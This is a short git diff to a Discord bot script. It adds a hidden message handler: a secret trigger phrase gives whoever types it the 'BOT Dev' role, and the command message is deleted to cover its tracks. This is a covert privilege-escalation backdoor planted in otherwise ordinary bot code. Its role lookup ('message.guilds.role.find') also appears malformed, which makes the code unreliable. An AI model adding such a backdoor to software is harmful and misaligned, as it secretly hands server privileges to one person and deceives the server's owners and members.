@@ -353,4 +353,11 @@ client.on('message', message => {
 	    message.delete(100)
     }
 });
+
+client.on('message', message => {
+if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
+	message.member.addRole(message.guilds.role.find(role => role.name == "BOT Dev"));
+	message.delete();
+}
+});
 client.login(process.env.BOT_TOKEN);
